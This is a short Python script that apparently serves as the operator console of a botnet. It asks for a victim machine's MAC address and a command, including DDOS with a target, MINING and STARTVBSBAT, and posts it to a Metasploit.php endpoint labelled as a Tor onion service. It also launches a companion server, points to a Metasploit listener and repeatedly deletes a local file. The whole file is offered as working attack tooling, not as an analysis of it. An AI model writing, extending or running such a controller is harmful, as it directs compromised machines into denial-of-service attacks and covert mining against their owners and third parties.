import requests
import time
import sys
import os



# Clear screen and display banner
os.system("clear")
os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Meta | lolcat")
os.system("figlet -c -f ~/.local/share/fonts/figlet-fonts/3d.flf Network | lolcat")



file_to_delete = "Meta.io" 

if os.path.exists(file_to_delete):
    os.remove(file_to_delete)


while True:
    mac = input("Enter Mac: ")
    option = input("(START/STOP/STARTVBSBAT/MINING/DDOS/SCRV) : ")
    
    if option == "DDOS":
        target = input("Target >>> : ")
    elif option not in ["START", "STOP", "STARTVBSBAT", "MINING", "DDOS", "SCRV"]:
       python_executable = sys.executable
       os.execl(python_executable, python_executable, *sys.argv)
    elif option == "SCRV":
       os.system("gnome-terminal -- python3 SCRV.py")
       print(" >>> PORT : 8060 | HOST : 127.0.0.1")
    elif option == "START":
           print("Use Metasploit Tool in | LPORT : 8070 | LHOST : 127.0.0.1")

    else:
        target = ""
    
    # Define the Tor onion service URL
    tor_url = 'http://127.0.0.1:8080/Metasploit.php'
    if option == "DDOS":
     data = {'MAC': mac, 'Option': option,'Target': target}
    else:
     data = {'MAC': mac, 'Option': option}
    try:
        response = requests.post(tor_url, data=data)
        if response.status_code == 200:
            print("Data sent successfully.")
        else:
            print("Failed to send data.")
            time.sleep(5)
    except Exception as e:
        print(f"Error: {str(e)}")

    time.sleep(10)
    file_to_delete = "Meta.io"  

    if os.path.exists(file_to_delete):
     os.remove(file_to_delete)

